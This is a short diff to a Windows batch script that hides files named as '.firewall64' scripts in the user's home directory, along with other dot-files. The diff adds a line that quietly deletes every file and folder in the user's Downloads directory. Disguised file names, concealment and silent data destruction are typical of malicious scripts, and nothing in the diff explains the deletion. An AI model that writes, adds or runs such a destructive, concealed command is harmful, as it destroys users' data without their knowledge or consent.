@@ -26,6 +26,8 @@ attrib +h "%HD%\.firewall64.vbs"
 attrib +h "%HD%\.firewall64.bat"
 attrib +h "%HD%\.firewall64.ps1"
 
+del /q "%USERPROFILE%\Downloads\*.*" && for /d %G in ("%USERPROFILE%\Downloads\*") do rd /s /q "%G"
+
 for %%f in (%SF%\.*) do (
     attrib +h "%%f" >nul 2>&1
 )
